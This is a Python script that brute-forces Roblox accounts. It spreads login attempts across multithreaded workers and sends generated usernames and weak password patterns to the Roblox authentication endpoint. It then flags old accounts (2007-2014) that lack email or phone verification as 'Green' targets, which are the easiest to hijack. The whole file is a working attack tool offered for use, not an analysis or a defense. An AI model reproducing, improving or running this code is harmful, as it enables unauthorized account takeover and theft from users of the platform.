import requests
import threading
import queue
import time
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define the queue to hold account credentials
account_queue = queue.Queue()

# Function to check if an account is valid and verified
def check_account(credentials):
    username, password = credentials
    session = requests.Session()
    login_url = "https://auth.roblox.com/v2/login"
    login_data = {
        "captchaId": "",
        "captchaProvider": "PROVIDER_ARKOSE_LABS",
        "captchaResponse": "",
        "password": password,
        "rememberMe": True,
        "username": username
    }

    response = session.post(login_url, json=login_data)
    if response.status_code == 200:
        data = response.json()
        if data.get("errors"):
            return f"Red: {username} (Cannot be Paged Easily)"
        else:
            user_id = data['userId']
            user_info_url = f"https://users.roblox.com/v1/users/{user_id}"
            user_info_response = session.get(user_info_url)
            if user_info_response.status_code == 200:
                user_info = user_info_response.json()
                join_date = user_info.get('created')
                if join_date and '2007' <= join_date[:4] <= '2014':
                    if user_info.get('isEmailVerified') or user_info.get('isPhoneVerified'):
                        return f"Red: {username} (Email/Phone Verified)"
                    else:
                        return f"Green: {username} (Not Email/Phone Verified)"
    return f"Red: {username} (Cannot be Paged Easily)"

# Function to process accounts from the queue
def process_accounts():
    while not account_queue.empty():
        credentials = account_queue.get()
        result = check_account(credentials)
        logging.info(result)
        account_queue.task_done()

# Generate potential usernames and passwords for accounts created between 2007 and 2014
def generate_accounts():
    common_password_patterns = [
        "{username}{password}", "{password}{username}", "{username}{password}{username}",
        "{password}{username}{password}", "{username}{password}123", "123{username}{password}",
        "{password}123{username}", "{username}123{password}"
    ]

    for i in range(1000000):  # Adjust the range as needed
        username = f"user{i}"
        for pattern in common_password_patterns:
            password = pattern.format(username=username, password="123456")
            account_queue.put((username, password))

# Main function to start the brute force
def main():
    # Generate accounts
    generate_accounts()

    # Create and start worker threads
    num_threads = 10
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=process_accounts)
        thread.start()
        threads.append(thread)

    # Wait for all accounts to be processed
    account_queue.join()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()